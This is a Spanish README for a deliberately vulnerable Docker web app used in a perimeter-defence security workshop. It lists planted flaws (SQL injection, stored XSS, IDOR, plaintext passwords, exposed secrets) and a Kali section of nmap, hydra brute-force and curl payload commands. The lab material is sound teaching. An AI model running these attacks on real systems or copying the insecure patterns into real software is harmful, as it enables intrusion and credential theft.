# Vuln App - Aplicación Vulnerable para Taller de Seguridad

⚠️ **ADVERTENCIA**: Esta aplicación es **INTENCIONALMENTE INSEGURA** y está diseñada exclusivamente para propósitos educativos en un entorno controlado de laboratorio.

## 🎯 Objetivo

Aplicación web vulnerable para demostrar cómo la infraestructura de seguridad perimetral (firewall OPNsense, Traefik, fail2ban) puede mitigar ataques sobre aplicaciones inseguras, sin modificar el código de la aplicación.

## 🚀 Inicio Rápido

```bash
# Construir y ejecutar
docker compose -f docker-compose.vulnerable.yml up --build

# La aplicación estará disponible en:
# http://localhost:8080
```

## 🔑 Credenciales

- **Usuario**: `admin`
- **Contraseña**: `admin`

Usuarios adicionales:
- `user1` / `password123`
- `user2` / `qwerty`

## 🐛 Vulnerabilidades Implementadas

### 1. SQL Injection en Login
- **Ruta**: `POST /login`
- **Vulnerabilidad**: Query construida con concatenación directa
- **Exploit**: `admin' OR '1'='1` como usuario

### 2. Contraseñas en Texto Plano
- **Vulnerabilidad**: Passwords almacenadas sin hash en SQLite
- **Exposición**: Visibles en `/admin?user=admin`

### 3. XSS Almacenado
- **Ruta**: `GET /comments` y `POST /comments`
- **Vulnerabilidad**: No se escapa el HTML en los comentarios
- **Exploit**: Publicar `<script>alert('XSS')</script>`

### 4. Control de Acceso Roto (IDOR)
- **Ruta**: `GET /admin?user=cualquiera`
- **Vulnerabilidad**: No verifica autenticación ni autorización
- **Exploit**: Cualquiera puede ver datos de cualquier usuario

### 5. Cookies Inseguras
- **Vulnerabilidad**: Cookies sin HttpOnly, Secure, ni firma
- **Impacto**: Sesiones manipulables desde JavaScript/DevTools

### 6. Exposición de Secretos
- **Ruta**: `GET /debug/env`
- **Vulnerabilidad**: Expone variables de entorno completas
- **Datos expuestos**: `APP_SECRET`, `API_KEY`, etc.

### 7. CORS Totalmente Abierto
- **Vulnerabilidad**: `Access-Control-Allow-Origin: *`
- **Impacto**: Cualquier sitio puede hacer peticiones

### 8. Puerto Expuesto Directamente
- **Vulnerabilidad**: Puerto 8080 mapeado directamente al host
- **Impacto**: Accesible sin proxy reverso ni rate limiting

## 🔨 Vectores de Ataque desde Kali Linux

```bash
# 1. Escaneo de puertos
nmap -Pn -p- IP_OBJETIVO

# 2. Fuerza bruta en login
hydra -l admin -P /usr/share/wordlists/rockyou.txt IP_OBJETIVO http-post-form "/login:username=^USER^&password=^PASS^:incorrectos"

# 3. SQL Injection manual
curl -X POST http://IP_OBJETIVO:8080/login \
  -d "username=admin' OR '1'='1&password=cualquiera"

# 4. XSS en comentarios
curl -X POST http://IP_OBJETIVO:8080/comments \
  -d "author=Hacker&content=<script>alert('XSS')</script>"

# 5. IDOR para extraer contraseñas
curl http://IP_OBJETIVO:8080/admin?user=admin
curl http://IP_OBJETIVO:8080/admin?user=user1
curl http://IP_OBJETIVO:8080/admin?user=user2

# 6. Extracción de secretos
curl http://IP_OBJETIVO:8080/debug/env
```

## 📁 Estructura del Proyecto

```
vuln-app/
├── Dockerfile                          # Build de la aplicación
├── docker-compose.vulnerable.yml       # Versión INSEGURA
├── package.json                        # Dependencias
├── server.js                           # Código de la aplicación
├── README.md                           # Este archivo
└── data/                               # Base de datos SQLite (creado en runtime)
    └── data.db
```

## 🛡️ Fase 2: Hardening (Sin Modificar Código)

En la siguiente fase del taller, se implementará:

1. **Firewall OPNsense**: Reglas de filtrado, IDS/IPS
2. **Traefik**: Proxy reverso, TLS, rate limiting
3. **Fail2ban**: Bloqueo automático tras intentos fallidos
4. **Dokploy**: Despliegue seguro con redes aisladas

La aplicación **NO será modificada**, demostrando que la seguridad perimetral puede mitigar muchos ataques.

## ⚠️ Descargo de Responsabilidad

Esta aplicación debe usarse **ÚNICAMENTE** en entornos controlados de laboratorio para propósitos educativos. No desplegar en producción ni exponer a Internet.

## 📝 Licencia

MIT - Solo para uso educativo
